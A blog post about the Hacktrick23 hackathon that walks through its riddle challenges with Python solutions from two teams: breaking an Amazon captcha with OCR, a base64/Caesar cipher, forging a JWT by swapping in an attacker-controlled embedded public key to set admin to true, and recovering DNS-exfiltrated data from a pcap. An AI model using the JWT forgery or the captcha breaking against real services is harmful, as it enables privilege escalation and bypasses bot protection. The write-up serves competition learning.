---
title: "Hacktrick23"
date: 2023-03-16T20:44:42+02:00
---
# Welcome...
That's our short journey with Hacktrick this year be ready for some useful information and a lot of drama.
First what is hacktrick??  
Hacktrick is a hackathon organized by Dell that took place in Egypt. The hackathon aimed to bring together young innovators and developers to work on real-world challenges and create innovative solutions using technology.  
This year the hackathon was about AI, cybercecurity and optimization, the problem in short is that you enter a maze (10*10) at the top left corner and the exit is at bottom right corner inside the maze there are 4 children you want to rescue, to rescue a child you need to solve a riddle and the score depends on the number of children you rescued, how many steps you took, and the time to solve the riddles and there is a rule that if you didn't exit at the bottom right corner you will get only 80% of the score finalyy you have 5 submissions and your best one is taken into account.
So intintuitively your aim was to rescue the largest number of children in the least number of steps.
You can make many approaches for this problem like RL and Informed search, we will talk about our approach later.  
[for the official documentation here.](https://github.com/HackTrick23/HackTrick23)
# Riddles...
Let's talk about the riddles firstly, there was 4 types of riddles each has a different weight (captcha=10, cipher=20, server=30, PCAP=40) To be honest the riddles difficulity level was disappointing they mostly depended on if you know base64 encoding or not, at our preperation for the hackathon we expected more than that.  
in the next few lines i will show snippets of code for out team "code of duty" and our friends team "respectively" you will know the reason for that in the DRAMA part stay tuned.  
## Captcha
You are given an amazon captcha in the form of 2d list and the target is to return the text inside it.  
solving it literrally took from us 2 lines of code using easyOCR open library which depends on pytorch an easier library was amazon captcha and it needs 2 lines of code too.
### code of duty approach:
```
def captcha_solver(question):
    reader = easyocr.Reader(['en'])
    result = reader.readtext(np.array(question, dtype=np.uint8))
    return result[0][1]
```
### respectively approach:
```
def captcha_solver(question):
    img_bytes = BytesIO()
    img = Image.fromarray(np.array(question).astype('uint8'))
    img.save(img_bytes, format='JPEG')
    captcha = AmazonCaptcha(img_bytes)
    captcha.img = img
    solution = captcha.solve()
    return solution
```
## Cipher
You are given message which was altered after it was ciphered and you need to return the original message.  
if you just noticed the it was altered just by encoding it base64 you are done with it, after decoding it it gives you the nessage in binary with the shift and you can solve it with normal Caesar cipher.
### code of duty approach:
we have a class to implement addpadding, getMessage functions
```
def cipher_solver(question):
    text = addpadding(question)
    binary = base64.decodebytes(text)
    binaryStr = str(binary)[3:-2]
    msg, shift = binaryStr.split(",")
    shift = int(shift, 2)
    return getMessage(msg, shift)
```
### respectively approach:
```
def cipher_solver(question):
    padding = 4 - len(question) % 4
    question += "=" * padding
    decoded = base64.b64decode(question).decode("utf-8")
    cipherBits, shiftBits = decoded.split(',')
    shift = int(shiftBits[:-1], 2)
    cipherBits = cipherBits[1:]

    capital = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U',
               'V', 'W', 'X', 'Y', 'Z']
    small = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u',
             'v', 'w', 'x', 'y', 'z']

    solution = ""
    for i in range(len(cipherBits) // 7):
        num = int(cipherBits[i * 7:(i + 1) * 7], 2)
        num = num % 128
        index = (ord(chr(num).lower()) - 97) - shift

        if num > 96:  # small
            solution += small[index]
        else:  # capital
            solution += capital[index]

    return solution
```
## Server
Ok honstly that problem took from us a lot much than it deserve.
you are given a jwt token which was signed with a private key and you to verify it you must decode that sign by a public key, the trick was that the public key used for vervication wwas send in he header of the token, so the solution wan simply through out this public key change what you need in the token and sign it with any private key and send with the header your public key.
### code of duty approach:
the public and privates keys were generated previously and loaded from a file.
```
def server_solver(question):
    decoded_payload = jwt.decode(question, options={"verify_signature": False})
    decoded_header = jwt.get_unverified_header(question)

    decoded_header['jwk']['e'] = _encode64Int(public_key.public_numbers().e)
    decoded_header['jwk']['n'] = _encode64Int(public_key.public_numbers().n)
    decoded_payload['admin'] = "true"
    jwt_token = jwt.encode(decoded_payload, private_key, algorithm="RS256", headers=decoded_header)
```
### respectively approach:
```
def server_solver(question):
    payload = jwt.decode(question, options={"verify_signature": False}, algorithms=["RS256"])
    payload['admin'] = "true"

    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
    )

    # Serialize the private key to PEM format
    pem_private_key = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )

    # Generate the public key from the private key
    public_key = private_key.public_key()

    # Serialize the public key to PEM format
    pem_public_key = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )

    jwk_public_key = jwk.JWK.from_pem(pem_public_key)

    new_token = jwt.encode(payload, key=pem_private_key, algorithm='RS256', headers={'jwk': jwk_public_key,
                                                                                     'kid': jwk_public_key["kid"]})

    return new_token
```
## PCAP
giving a pcap file, and you know that the server was DNS exfilterated from a specific IP you need to get what information was leaked.
just filter the packets with the IP again decode the subdomains with base64 and that's it.
```
def pcap_solver(question):
    sol = {}
    # Decode the Base64-encoded pcap file
    pcap_data = base64.b64decode(question)
    # Parse the packets using scapy
    packets = rdpcap(BytesIO(pcap_data))
    dns_packets = filter(lambda pkt: DNS in pkt and pkt[IP].dst == '188.68.45.12', packets)
    for pkt in dns_packets:
        query = pkt[DNSQR].qname.decode()
        splited = query.split(".")
        if len(splited[0]) % 4 != 0:
            padding_length = 4 - (len(splited[0]) % 4)
            splited[0] += "=" * padding_length
        if len(splited[1]) % 4 != 0:
            padding_length = 4 - (len(splited[1]) % 4)
            splited[1] += "=" * padding_length
        try:
            # Decode the base64 string to bytes
            num = base64.b64decode(splited[0])
            content = base64.b64decode(splited[1])
            num_str = num.decode('ascii')
            content_str = content.decode('ascii')
            sol[num_str] = content_str
        except:
            print("error")

    secret = ""
    for key in range(1, len(sol)+1):
        secret += sol[str(key)]
    return(secret)
    
```
### respectively approach:
```
def pcap_solver(question):
    pcap_data = base64.b64decode(question)
    packets = rdpcap(io.BytesIO(pcap_data))
    data = {}
    for packet in packets:
        if DNSQR in packet and IP in packet and packet[IP].src == '188.68.45.12':
            dns_query_name = packet[DNSQR].qname.decode('utf-8')
            num = dns_query_name.find('.')
            rank_base64 = dns_query_name[:num]
            padding = 4 - len(rank_base64) % 4
            rank_base64 += "=" * padding
            first = base64.b64decode(rank_base64).decode('utf-8')
            cipherbase64 = dns_query_name[num + 1:dns_query_name.find('.', num + 1)]
            padding = 4 - len(cipherbase64) % 4
            cipherbase64 += "=" * padding
            second = base64.b64decode(cipherbase64).decode('utf-8')
            data[first] = second
    data = dict(sorted(data.items()))
    solution = ""
    for i in data:
        solution += data[i]
    return solution
```
# Maze Solver...
As i mentioned before the maze was 10*10 you need to enter and rescue as many children as you can then exit in least number of steps.

